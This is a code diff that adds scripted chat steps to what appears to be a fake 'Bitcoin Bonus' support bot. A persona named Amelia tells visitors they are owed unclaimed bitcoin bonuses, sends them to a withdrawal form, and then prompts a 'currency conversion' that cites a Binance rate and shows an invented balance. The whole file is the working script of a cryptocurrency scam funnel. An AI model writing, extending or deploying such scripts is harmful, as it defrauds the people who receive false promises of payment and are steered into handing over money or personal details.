@@ -93,6 +93,45 @@ export const managerThirdStep = [
   }
 ]
 
+export const managerFourthStep = [
+  // YES
+  {
+    text: "Thank you for your response. Your account has an approved request to withdraw bitcoin bonuses earned. To proceed with the transfer to your card or wallet, we need the completed withdrawal application form. I'll quickly retrieve it for you. It should take no more than a minute."
+  },
+  {
+    wait: true,
+    text: "Thank you for your patience. After reviewing our database, I couldn't locate your profile, indicating that you haven't yet withdrawn your bitcoins from our service."
+  },
+  {
+    text: "I'll now present to you the special form for completing the withdrawal application and receiving your funds."
+  },
+  {
+    text: " ",
+    btn: [{ label: "Fill out the form", value: "fill_form" }]
+  }
+]
+
+export const managerFifthStep = [
+  // Currency exchange
+  {
+    text: "I received a questionnaire from you"
+  },
+  {
+    text: "To complete the payout, you and I must now exchange your bitcoins."
+  },
+  {
+    text: "Minimum exchange rate by special service Binance, which amounts to 0,25%"
+  },
+  {
+    balance: true,
+    text: "After the currency conversion you will receive $-balance-"
+  },
+  {
+    text: " ",
+    btn: [{ label: "Convert currency", value: "convert" }]
+  }
+]
+
 export const managerBonuses = [
   {
     text: "My name is Amelia, and I am the lead manager of the Service Payments Department 'Bitcoin Bonus' .Judging by the information I have, you have not been on the site for 364 days. Related to this question, have you previously received notice that you are entitled to payment from Bitcoin Bonus?"
